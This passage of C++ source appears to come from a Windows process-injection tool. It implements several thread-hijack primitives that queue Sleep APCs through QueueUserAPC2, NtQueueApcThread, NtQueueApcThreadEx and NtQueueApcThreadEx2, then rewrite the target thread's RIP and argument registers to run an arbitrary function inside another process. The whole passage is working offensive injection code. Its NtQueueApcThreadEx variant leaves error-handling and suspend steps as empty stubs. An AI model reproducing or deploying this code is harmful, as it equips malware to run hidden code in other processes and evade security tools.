                std::cout << "    [Check Alertable] Thread State=Running. May process APC later." << std::endl;
            // Return true here if you want to proceed even if it's running,
            // acknowledging the delay. Return false if you require it to be waiting already.
            // Let's be stricter for now and require a Waiting state.
            // return true;
        }
        // Condition 3: Maybe it's already in DelayExecution from a *previous* Sleep?
        // This is less likely what we want for queuing a *new* APC, but worth noting.
        if (state == Waiting && (waitReason == DelayExecution || waitReason == WrDelayExecution))
        {
            if (verbose)
                std::cout << "    [Check Alertable] Thread State=Waiting, Reason=DelayExecution. Already sleeping." << std::endl;
            // It might still process our new APC when it wakes up, but it's not ideal.
            // return true; // Decide if this state is acceptable
        }

        // If none of the above, likely not immediately alertable
        if (verbose)
            std::cout << "    [Check Alertable] Thread State=" << state << ", Reason=" << waitReason << ". Not typically alertable immediately." << std::endl;
        return false;
    }
    else
    {
        // GetThreadStateAndWaitReason failed
        if (verbose)
            std::cerr << "    [Check Alertable] Failed to get thread state/reason." << std::endl;
        return false;
    }
}
bool ExecuteRemoteFunctionViaQueueUserAPC2Hijack(
    HANDLE hProcess,
    const InjectionConfig &config,
    LPVOID pfnTargetFunction,
    DWORD64 arg1, DWORD64 arg2, DWORD64 arg3, DWORD64 arg4,
    LPVOID pSleep,
    LPVOID loopGadgetAddr)
{
    if (!pQueueUserAPC2)
    {
        std::cerr << "[!] QueueUserAPC2 function pointer is NULL!" << std::endl;
        return false;
    }
    if (!pSleep || !loopGadgetAddr)
    {
        std::cerr << "[!] Sleep or Loop Gadget address not initialized!" << std::endl;
        return false;
    }
    if (config.targetTid == 0)
    {
        std::cerr << "[!] Target TID is zero!" << std::endl;
        return false;
    }

    DWORD dwThreadDesiredAccess = THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION | THREAD_GET_CONTEXT;
    if (config.useSuspend)
        dwThreadDesiredAccess |= THREAD_SUSPEND_RESUME;
    HANDLE hThread = OpenThread(dwThreadDesiredAccess, FALSE, config.targetTid);
    if (!hThread)
    {
        std::cerr << "[!] OpenThread failed for TID " << config.targetTid << ". Error: " << GetLastError() << std::endl;
        return false;
    }

    // 1. Queue Sleep APC with special flag
    const DWORD APCSleepDurationMs = 200;
    BOOL queueResult = pQueueUserAPC2(
        (PAPCFUNC)pSleep,
        hThread,
        (ULONG_PTR)APCSleepDurationMs,
        QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
        0);
    if (!queueResult)
    {
        std::cerr << "[!] QueueUserAPC2 failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hThread);
        return false;
    }

    // 2. Wait for thread to sleep
    if (!WaitForThreadToSleep(config.targetTid, 3000, config.verbose))
    {
        std::cerr << "[!] Failed to detect thread entering sleep state." << std::endl;
        CloseHandle(hThread);
        return false;
    }

    // 3. Hijack to loop gadget
    bool suspended1 = false;
    if (config.useSuspend)
    {
        if (SuspendThread(hThread) != (DWORD)-1)
            suspended1 = true;
    }
    CONTEXT ctx1 = {0};
    ctx1.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(hThread, &ctx1))
    {
        if (suspended1)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }
    ctx1.Rip = (DWORD64)loopGadgetAddr;
    if (!SetThreadContext(hThread, &ctx1))
    {
        if (suspended1)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }
    if (suspended1)
        ResumeThread(hThread);

    // 4. Wait for thread to exit sleep and start looping
    if (!WaitForThreadToRunOrReady(config.targetTid, 3000, config.verbose))
    {
        CloseHandle(hThread);
        return false;
    }
    Sleep(20);

    // 5. Hijack to target function
    bool suspended2 = false;
    if (config.useSuspend)
    {
        if (SuspendThread(hThread) != (DWORD)-1)
            suspended2 = true;
    }
    CONTEXT ctx2 = {0};
    ctx2.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    if (!GetThreadContext(hThread, &ctx2))
    {
        if (suspended2)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }
    if (ctx2.Rip != (DWORD64)loopGadgetAddr)
    {
        if (suspended2)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }
    ctx2.Rip = (DWORD64)pfnTargetFunction;
    ctx2.Rcx = arg1;
    ctx2.Rdx = arg2;
    ctx2.R8 = arg3;
    ctx2.R9 = arg4;
    if (!SetThreadContext(hThread, &ctx2))
    {
        if (suspended2)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }
    if (suspended2)
        ResumeThread(hThread);

    CloseHandle(hThread);
    return true;
}

// --- NtQueueApcThread Hijack Primitive ---
bool ExecuteRemoteFunctionViaNtQueueApcThread(
    HANDLE hProcess,
    const InjectionConfig &config,
    LPVOID pfnTargetFunction,
    DWORD64 arg1, DWORD64 arg2, DWORD64 arg3, DWORD64 arg4,
    LPVOID pSleep,
    LPVOID loopGadgetAddr)
{
    // Check requirements
    if (!pNtQueueApcThread)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: NtQueueApcThread function pointer is NULL!" << std::endl;
        return false;
    }
    if (!pSleep || !loopGadgetAddr)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: Sleep or Loop Gadget address not initialized!" << std::endl;
        return false;
    }
    if (config.targetTid == 0)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: Target TID is zero!" << std::endl;
        return false;
    }

    // Configuration
    const DWORD APCSleepDurationMs = 200;
    const int SleepWaitTimeoutMs = 3000;
    const int WakeWaitTimeoutMs = APCSleepDurationMs + 1000;
    const int LoopConfirmTimeoutMs = 500;
    const int LoopCheckIntervalMs = 50;

    if (config.verbose)
    {
        std::cout << "  [NtQueueApcThread Hijack] Executing function at 0x" << std::hex << pfnTargetFunction
                  << " via NtQueueApcThread+Hijack on TID " << std::dec << config.targetTid << std::endl;
        std::cout << "  [NtQueueApcThread Hijack] Args: Arg1=0x" << std::hex << arg1
                  << " Arg2=0x" << arg2 << " Arg3=0x" << arg3 << " Arg4=0x" << arg4 << std::dec << std::endl;
    }

    // Open target thread
    DWORD dwThreadDesiredAccess = THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION | THREAD_GET_CONTEXT;
    if (config.useSuspend)
        dwThreadDesiredAccess |= THREAD_SUSPEND_RESUME;
    HANDLE hThread = OpenThread(dwThreadDesiredAccess, FALSE, config.targetTid);
    if (!hThread)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: OpenThread failed for TID "
                  << config.targetTid << ". Error: " << GetLastError() << std::endl;
        return false;
    }
    if (config.verbose)
        std::cout << "  [NtQueueApcThread Hijack] Opened thread handle." << std::endl;

    // Queue Sleep APC
    if (config.verbose)
        std::cout << "  [NtQueueApcThread Hijack] Stage 1: Queueing NtQueueApcThread(Sleep(" << APCSleepDurationMs << "))" << std::endl;
    NTSTATUS status = pNtQueueApcThread(
        hThread,
        (PPS_APC_ROUTINE)pSleep,
        (PVOID)(ULONG_PTR)APCSleepDurationMs, // Sleep duration
        NULL,
        NULL);

    if (status != STATUS_SUCCESS)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: NtQueueApcThread(Sleep) failed. NTSTATUS: 0x"
                  << std::hex << status << std::dec << std::endl;
        CloseHandle(hThread);
        return false;
    }

    // Wait for thread to enter sleep state
    if (!WaitForThreadToSleep(config.targetTid, SleepWaitTimeoutMs, config.verbose))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: Thread did not enter sleep state." << std::endl;
        CloseHandle(hThread);
        return false;
    }

    // Hijack to loop gadget
    if (config.verbose)
        std::cout << "  [NtQueueApcThread Hijack] Stage 2: Hijacking Sleep -> Loop" << std::endl;
    bool suspended1 = false;
    if (config.useSuspend)
    {
        if (SuspendThread(hThread) != (DWORD)-1)
            suspended1 = true;
    }

    CONTEXT ctx1 = {0};
    ctx1.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(hThread, &ctx1))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: GetThreadContext (1) failed. Error: " << GetLastError() << std::endl;
        if (suspended1)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    ctx1.Rip = (DWORD64)loopGadgetAddr;
    if (config.verbose)
        std::cout << "    [Context] Setting RIP to Loop Gadget: 0x" << std::hex << ctx1.Rip << std::dec << std::endl;

    if (!SetThreadContext(hThread, &ctx1))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: SetThreadContext (1) failed. Error: " << GetLastError() << std::endl;
        if (suspended1)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    if (suspended1)
    {
        if (ResumeThread(hThread) == (DWORD)-1)
        {
            std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: ResumeThread (1) failed. Error: " << GetLastError() << std::endl;
            CloseHandle(hThread);
            return false;
        }
    }

    // Wait for thread to exit sleep and start looping
    if (!WaitForThreadToRunOrReady(config.targetTid, WakeWaitTimeoutMs, config.verbose))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: Thread did not exit sleep state." << std::endl;
        CloseHandle(hThread);
        return false;
    }
    Sleep(20); // Small delay for stability

    // Verify thread RIP is at loop gadget
    bool ripConfirmed = false;
    auto startTimeConfirmRip = std::chrono::steady_clock::now();
    CONTEXT ctx_check = {0};
    ctx_check.ContextFlags = CONTEXT_CONTROL;

    while (std::chrono::duration_cast<std::chrono::milliseconds>(
               std::chrono::steady_clock::now() - startTimeConfirmRip)
               .count() < LoopConfirmTimeoutMs)
    {
        if (GetThreadContext(hThread, &ctx_check))
        {
            if (ctx_check.Rip == (DWORD64)loopGadgetAddr)
            {
                ripConfirmed = true;
                break;
            }
        }
        Sleep(LoopCheckIntervalMs);
    }

    if (!ripConfirmed)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: Failed to confirm thread at loop gadget." << std::endl;
        CloseHandle(hThread);
        return false;
    }

    // Hijack to target function
    if (config.verbose)
        std::cout << "  [NtQueueApcThread Hijack] Stage 3: Hijacking Loop -> Target Function" << std::endl;
    bool suspended2 = false;
    if (config.useSuspend)
    {
        if (SuspendThread(hThread) != (DWORD)-1)
            suspended2 = true;
    }

    CONTEXT ctx2 = {0};
    ctx2.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    if (!GetThreadContext(hThread, &ctx2))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: GetThreadContext (2) failed. Error: " << GetLastError() << std::endl;
        if (suspended2)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    // Verify thread is still at loop gadget
    if (ctx2.Rip != (DWORD64)loopGadgetAddr)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: Thread RIP changed before final hijack! Expected: 0x"
                  << std::hex << loopGadgetAddr << " Actual: 0x" << ctx2.Rip << std::dec << std::endl;
        if (suspended2)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    // Set up target function call with arguments
    ctx2.Rip = (DWORD64)pfnTargetFunction;
    ctx2.Rcx = arg1;
    ctx2.Rdx = arg2;
    ctx2.R8 = arg3;
    ctx2.R9 = arg4;

    if (config.verbose)
    {
        std::cout << "    [Context] Setting Context for Target Function call:" << std::endl;
        std::cout << "      RIP = 0x" << std::hex << ctx2.Rip << std::endl;
        std::cout << "      RCX = 0x" << ctx2.Rcx << std::endl;
        std::cout << "      RDX = 0x" << ctx2.Rdx << std::endl;
        std::cout << "      R8  = 0x" << ctx2.R8 << std::dec << std::endl;
        std::cout << "      R9  = 0x" << ctx2.R9 << std::dec << std::endl;
    }

    if (!SetThreadContext(hThread, &ctx2))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: SetThreadContext (2) failed. Error: " << GetLastError() << std::endl;
        if (suspended2)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    if (suspended2)
    {
        if (ResumeThread(hThread) == (DWORD)-1)
        {
            std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThread: ResumeThread (2) failed. Error: " << GetLastError() << std::endl;
            CloseHandle(hThread);
            return false;
        }
    }

    // Cleanup
    CloseHandle(hThread);
    if (config.verbose)
        std::cout << "  [NtQueueApcThread Hijack] Hijack sequence complete." << std::endl;
    return true;
}

// --- Hijack Primitive using NtQueueApcThreadEx ---
bool ExecuteRemoteFunctionViaNtQueueApcExHijack(
    HANDLE hProcess,
    const InjectionConfig &config,
    LPVOID pfnTargetFunction,
    DWORD64 arg1, DWORD64 arg2, DWORD64 arg3, DWORD64 arg4,
    LPVOID pSleep,
    LPVOID loopGadgetAddr)
{
    // Check if the required Native API is loaded
    if (!pNtQueueApcThreadEx)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcExHijack: NtQueueApcThreadEx function pointer is NULL!" << std::endl;
        return false;
    }
    if (!pNtQuerySystemInformation)
    { /* Need state checking */
        return false;
    }
    if (!pSleep || !loopGadgetAddr)
    { /* error */
        return false;
    }
    if (config.targetTid == 0)
    { /* error */
        return false;
    }

    // --- Configuration ---
    const DWORD APCSleepDurationMs = 200;
    const int SleepWaitTimeoutMs = 3000;
    const int WakeWaitTimeoutMs = APCSleepDurationMs + 1000;
    const int LoopConfirmTimeoutMs = 500;
    const int LoopCheckIntervalMs = 50;

    if (config.verbose)
    {
        std::cout << "  [NtQAPCEx Hijack Primitive] Executing function at 0x" << std::hex << pfnTargetFunction
                  << " via NtQAPCEx+Hijack on TID " << std::dec << config.targetTid << std::endl;
        std::cout << "  [NtQAPCEx Hijack Primitive] Args: Arg1=0x" << std::hex << arg1 << " Arg2=0x" << arg2 << " Arg3=0x" << arg3 << std::dec << std::endl;
    }

    // --- Open Target Thread ---
    DWORD dwThreadDesiredAccess = THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME;
    HANDLE hThread = OpenThread(dwThreadDesiredAccess, FALSE, config.targetTid);
    if (!hThread)
    { /* error */
        return false;
    }
    if (config.verbose)
        std::cout << "  [NtQAPCEx Hijack Primitive] Opened thread handle.\n";

    // --- Stage 1: Queue APC using NtQueueApcThreadEx ---
    if (config.verbose)
        std::cout << "  [NtQAPCEx Hijack Primitive] === Stage 1: Queueing NtQueueApcThreadEx(Sleep(" << APCSleepDurationMs << ")) ===\n";
    // Note: NtQueueApcThreadEx takes PPS_APC_ROUTINE, which is technically different from PAPCFUNC,
    // but for simple functions like Sleep it often works. A wrapper might be needed otherwise.
    // We pass Sleep duration as the first argument.
    // https://repnz.github.io/posts/apc/user-apc/#ntqueueapcthreadex-meet-special-user-apc https://ntdoc.m417z.com/ntqueueapcthreadex
    // https://ntdoc.m417z.com/queue_user_apc_special_user_apc

    NTSTATUS status = pNtQueueApcThreadEx(
        hThread,
        (HANDLE)1,                            // apc_special_user_apc
        (PPS_APC_ROUTINE)pSleep,              // APC Routine
        (PVOID)(ULONG_PTR)APCSleepDurationMs, // ApcArgument1 (Sleep's dwMilliseconds)
        NULL,                                 // ApcArgument2
        NULL                                  // ApcArgument3
    );

    if (status != STATUS_SUCCESS)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcExHijack: NtQueueApcThreadEx failed. NTSTATUS: 0x" << std::hex << status << std::dec << std::endl;
        CloseHandle(hThread);
        return false;
    }
    if (config.verbose)
        std::cout << "  [NtQAPCEx Hijack Primitive] NtQueueApcThreadEx call successful.\n";

    // --- Wait for Thread to Enter Sleep State ---
    if (!WaitForThreadToSleep(config.targetTid, SleepWaitTimeoutMs, config.verbose))
    {
        /* error handling */ CloseHandle(hThread);
        return false;
    }

    // --- Stage 1.5: Hijack During Sleep -> Infinite Loop ---
    if (config.verbose)
        std::cout << "  [NtQAPCEx Hijack Primitive] === Stage 1.5: Attempting Hijack (Sleep -> Loop) ===\n";
    CONTEXT ctx1 = {0};
    ctx1.ContextFlags = CONTEXT_CONTROL;
    bool suspended1 = false;
    if (config.useSuspend)
    { /* Suspend */
    }
    if (!GetThreadContext(hThread, &ctx1))
    { /* error */
    }
    if (config.verbose)
        std::cout << "    [Context] Hijacking from RIP: 0x" << std::hex << ctx1.Rip << std::dec << "\n";
    ctx1.Rip = (DWORD64)loopGadgetAddr;
    if (!SetThreadContext(hThread, &ctx1))
    { /* error */
    }
    if (suspended1)
    { /* Resume */
    }

    // --- Verification Step A: Wait for Thread to Finish Sleeping ---
    if (!WaitForThreadToRunOrReady(config.targetTid, WakeWaitTimeoutMs, config.verbose))
    {
        /* error */ CloseHandle(hThread);
        return false;
    }

    // --- Verification Step B: Confirm RIP is now at Loop Gadget ---
    if (config.verbose)
        std::cout << "  [NtQAPCEx Hijack Primitive] Verifying Thread RIP is at Loop Gadget...\n";
    bool ripConfirmed = false;
    // ... (Loop checking RIP against loopGadgetAddr) ...
    auto startTimeConfirmRip = std::chrono::steady_clock::now();
    CONTEXT ctx_check_rip = {0};
    ctx_check_rip.ContextFlags = CONTEXT_CONTROL;
    DWORD lastError_ripCheck = 0;
    while (std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - startTimeConfirmRip).count() < LoopConfirmTimeoutMs)
    {
        if (GetThreadContext(hThread, &ctx_check_rip))
        {
            if (ctx_check_rip.Rip == (DWORD64)loopGadgetAddr)
            {
                ripConfirmed = true;
                break;
            }
        }
        else
        {
            lastError_ripCheck = GetLastError();
        }
        ::Sleep(LoopCheckIntervalMs);
    }
    if (!ripConfirmed)
    { /* error */
        CloseHandle(hThread);
        return false;
    }

    // --- Stage 2: Hijack the Spinning Thread -> Target Function ---
    if (config.verbose)
        std::cout << "  [NtQAPCEx Hijack Primitive] === Stage 2: Hijacking Loop -> Target Function (0x" << std::hex << pfnTargetFunction << std::dec << ") ===\n";
    bool suspended2 = false;
    if (config.useSuspend)
    { /* Suspend */
    }
    CONTEXT ctx2 = {0};
    ctx2.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    if (!GetThreadContext(hThread, &ctx2))
    { /* error */
    }
    if (ctx2.Rip != (DWORD64)loopGadgetAddr)
    { /* Critical warning */
    }
    if (config.verbose)
        std::cout << "    [Context] Confirmed RIP at loop gadget before final hijack.\n";

    // Setup target function call (using first 3 args for NtQueueApcThreadEx convention)
    // The target function will receive these in RCX, RDX, R8 (x64 convention)
    ctx2.Rip = (DWORD64)pfnTargetFunction;
    ctx2.Rcx = arg1;
    ctx2.Rdx = arg2;
    ctx2.R8 = arg3;
    ctx2.R9 = 0; // R9 is not passed by NtQueueApcThreadEx APC mechanism
    if (config.verbose)
    { /* Print context */
    }
    if (!SetThreadContext(hThread, &ctx2))
    { /* error */
    }
    if (suspended2)
    { /* Resume */
    }

    // --- Wait for Function Execution (Optional) ---
    const int PostHijackWaitMs = 100;
    if (config.verbose)
        std::cout << "  [NtQAPCEx Hijack Primitive] Waiting briefly (" << PostHijackWaitMs << "ms) post-hijack..." << std::endl;
    ::Sleep(PostHijackWaitMs);

    // --- Cleanup ---
    CloseHandle(hThread);
    if (config.verbose)
        std::cout << "  [NtQAPCEx Hijack Primitive] Hijack sequence complete.\n";
    return true;
}

// --- Hijack Primitive using NtQueueApcThreadEx2 ---
bool ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack(
    HANDLE hProcess,
    const InjectionConfig &config,
    LPVOID pfnTargetFunction,
    DWORD64 arg1, DWORD64 arg2, DWORD64 arg3, DWORD64 arg4,
    LPVOID pSleep,
    LPVOID loopGadgetAddr)
{
    // Check if the required Native API is loaded
    if (!pNtQueueApcThreadEx2)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: NtQueueApcThreadEx2 function pointer is NULL!" << std::endl;
        return false;
    }
    if (!pNtQuerySystemInformation)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: NtQuerySystemInformation function pointer is NULL!" << std::endl;
        return false;
    }
    if (!pSleep || !loopGadgetAddr)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: Sleep or Loop Gadget address not initialized!" << std::endl;
        return false;
    }
    if (config.targetTid == 0)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: Target TID is zero!" << std::endl;
        return false;
    }

    // --- Configuration ---
    const DWORD APCSleepDurationMs = 200;
    const int SleepWaitTimeoutMs = 3000;
    const int WakeWaitTimeoutMs = APCSleepDurationMs + 1000;
    const int LoopConfirmTimeoutMs = 500;
    const int LoopCheckIntervalMs = 50;

    if (config.verbose)
    {
        std::cout << "  [NtQAPCEx2 Hijack Primitive] Executing function at 0x" << std::hex << pfnTargetFunction
                  << " via NtQAPCEx2+Hijack on TID " << std::dec << config.targetTid << std::endl;
        std::cout << "  [NtQAPCEx2 Hijack Primitive] Args: Arg1=0x" << std::hex << arg1
                  << " Arg2=0x" << arg2 << " Arg3=0x" << arg3 << " Arg4=0x" << arg4 << std::dec << std::endl;
    }

    // --- Open Target Thread ---
    DWORD dwThreadDesiredAccess = THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME;
    HANDLE hThread = OpenThread(dwThreadDesiredAccess, FALSE, config.targetTid);
    if (!hThread)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: Failed to open thread. Error: " << GetLastError() << std::endl;
        return false;
    }
    if (config.verbose)
        std::cout << "  [NtQAPCEx2 Hijack Primitive] Opened thread handle.\n";

    // --- Stage 1: Queue APC using NtQueueApcThreadEx2 ---
    if (config.verbose)
        std::cout << "  [NtQAPCEx2 Hijack Primitive] === Stage 1: Queueing NtQueueApcThreadEx2(Sleep(" << APCSleepDurationMs << ")) ===\n";

    // Note: NtQueueApcThreadEx2 has an extra parameter compared to NtQueueApcThreadEx
    // NTSTATUS NtQueueApcThreadEx2(
    //     HANDLE ThreadHandle,                  // Thread handle
    //     HANDLE UserApcReserveHandle,          // User APC reserve handle (NULL for normal)
    //     HANDLE SpecialUserApc,                // Special user APC flag (1 for special)
    //     PPS_APC_ROUTINE ApcRoutine,           // APC routine
    //     PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3) // Arguments for APC routine

    NTSTATUS status = pNtQueueApcThreadEx2(
        hThread,                              // Thread handle
        NULL,                                 // User APC reserve handle (NULL for normal)
        (ULONG)1,                             // Special user APC flag (1 = special, force delivery)
        (PPS_APC_ROUTINE)pSleep,              // APC Routine = Sleep
        (PVOID)(ULONG_PTR)APCSleepDurationMs, // ApcArgument1 (Sleep's dwMilliseconds)
        NULL,                                 // ApcArgument2
        NULL                                  // ApcArgument3
    );

    if (status != STATUS_SUCCESS)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: NtQueueApcThreadEx2 failed. NTSTATUS: 0x"
                  << std::hex << status << std::dec << std::endl;
        CloseHandle(hThread);
        return false;
    }
    if (config.verbose)
        std::cout << "  [NtQAPCEx2 Hijack Primitive] NtQueueApcThreadEx2 call successful.\n";

    // --- Wait for Thread to Enter Sleep State ---
    if (!WaitForThreadToSleep(config.targetTid, SleepWaitTimeoutMs, config.verbose))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: Thread did not enter sleep state." << std::endl;
        CloseHandle(hThread);
        return false;
    }

    // --- Stage 1.5: Hijack During Sleep -> Infinite Loop ---
    if (config.verbose)
        std::cout << "  [NtQAPCEx2 Hijack Primitive] === Stage 1.5: Attempting Hijack (Sleep -> Loop) ===\n";

    bool suspended1 = false;
    if (config.useSuspend)
    {
        if (SuspendThread(hThread) != (DWORD)-1)
        {
            suspended1 = true;
            if (config.verbose)
                std::cout << "    [Suspend] Thread suspended.\n";
        }
        else
        {
            std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: SuspendThread failed. Error: " << GetLastError() << std::endl;
            // Continue without suspend as we might still succeed
        }
    }

    CONTEXT ctx1 = {0};
    ctx1.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(hThread, &ctx1))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: GetThreadContext (1) failed. Error: " << GetLastError() << std::endl;
        if (suspended1)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    if (config.verbose)
        std::cout << "    [Context] Hijacking from RIP: 0x" << std::hex << ctx1.Rip << std::dec << "\n";

    // Set RIP to loop gadget
    ctx1.Rip = (DWORD64)loopGadgetAddr;
    if (!SetThreadContext(hThread, &ctx1))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: SetThreadContext (1) failed. Error: " << GetLastError() << std::endl;
        if (suspended1)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    if (suspended1)
    {
        if (ResumeThread(hThread) == (DWORD)-1)
        {
            std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: ResumeThread failed. Error: " << GetLastError() << std::endl;
            CloseHandle(hThread);
            return false;
        }
        if (config.verbose)
            std::cout << "    [Suspend] Thread resumed.\n";
    }

    // --- Verification Step A: Wait for Thread to Finish Sleeping ---
    if (!WaitForThreadToRunOrReady(config.targetTid, WakeWaitTimeoutMs, config.verbose))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: Thread did not exit sleep state." << std::endl;
        CloseHandle(hThread);
        return false;
    }

    // --- Verification Step B: Confirm RIP is now at Loop Gadget ---
    if (config.verbose)
        std::cout << "  [NtQAPCEx2 Hijack Primitive] Verifying Thread RIP is at Loop Gadget...\n";

    bool ripConfirmed = false;
    auto startTimeConfirmRip = std::chrono::steady_clock::now();
    CONTEXT ctx_check_rip = {0};
    ctx_check_rip.ContextFlags = CONTEXT_CONTROL;

    while (std::chrono::duration_cast<std::chrono::milliseconds>(
               std::chrono::steady_clock::now() - startTimeConfirmRip)
               .count() < LoopConfirmTimeoutMs)
    {
        if (GetThreadContext(hThread, &ctx_check_rip))
        {
            if (ctx_check_rip.Rip == (DWORD64)loopGadgetAddr)
            {
                ripConfirmed = true;
                if (config.verbose)
                    std::cout << "    [Verify] RIP confirmed at loop gadget.\n";
                break;
            }
        }
        ::Sleep(LoopCheckIntervalMs);
    }

    if (!ripConfirmed)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: Failed to confirm thread at loop gadget." << std::endl;
        CloseHandle(hThread);
        return false;
    }

    // --- Stage 2: Hijack the Spinning Thread -> Target Function ---
    if (config.verbose)
        std::cout << "  [NtQAPCEx2 Hijack Primitive] === Stage 2: Hijacking Loop -> Target Function (0x"
                  << std::hex << pfnTargetFunction << std::dec << ") ===\n";

    bool suspended2 = false;
    if (config.useSuspend)
    {
        if (SuspendThread(hThread) != (DWORD)-1)
        {
            suspended2 = true;
            if (config.verbose)
                std::cout << "    [Suspend] Thread suspended.\n";
        }
        else
        {
            std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: SuspendThread (2) failed. Error: " << GetLastError() << std::endl;
            // Continue without suspend
        }
    }

    CONTEXT ctx2 = {0};
    ctx2.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    if (!GetThreadContext(hThread, &ctx2))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: GetThreadContext (2) failed. Error: " << GetLastError() << std::endl;
        if (suspended2)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    // Verify thread is still at loop gadget
    if (ctx2.Rip != (DWORD64)loopGadgetAddr)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: Thread RIP changed before final hijack! Expected: 0x"
                  << std::hex << loopGadgetAddr << " Actual: 0x" << ctx2.Rip << std::dec << std::endl;
        if (suspended2)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }
    if (config.verbose)
        std::cout << "    [Context] Confirmed RIP at loop gadget before final hijack.\n";

    // Setup target function call with arguments
    ctx2.Rip = (DWORD64)pfnTargetFunction;
    ctx2.Rcx = arg1;
    ctx2.Rdx = arg2;
    ctx2.R8 = arg3;
    ctx2.R9 = arg4; // Full register set for our hijack method

    if (config.verbose)
    {
        std::cout << "    [Context] Setting Context for Target Function call:" << std::endl;
        std::cout << "      RIP = 0x" << std::hex << ctx2.Rip << std::endl;
        std::cout << "      RCX = 0x" << ctx2.Rcx << std::endl;
        std::cout << "      RDX = 0x" << ctx2.Rdx << std::endl;
        std::cout << "      R8  = 0x" << ctx2.R8 << std::endl;
        std::cout << "      R9  = 0x" << ctx2.R9 << std::dec << std::endl;
    }

    if (!SetThreadContext(hThread, &ctx2))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: SetThreadContext (2) failed. Error: " << GetLastError() << std::endl;
        if (suspended2)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    if (suspended2)
    {
        if (ResumeThread(hThread) == (DWORD)-1)
        {
            std::cerr << "[!] ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack: ResumeThread (2) failed. Error: " << GetLastError() << std::endl;
            CloseHandle(hThread);
            return false;
        }
        if (config.verbose)
            std::cout << "    [Suspend] Thread resumed. Will now execute target function.\n";
    }

    // --- Small Wait After Execution (Optional) ---
    const int PostHijackWaitMs = 50;
    if (config.verbose)
        std::cout << "  [NtQAPCEx2 Hijack Primitive] Waiting briefly (" << PostHijackWaitMs << "ms) post-hijack..." << std::endl;
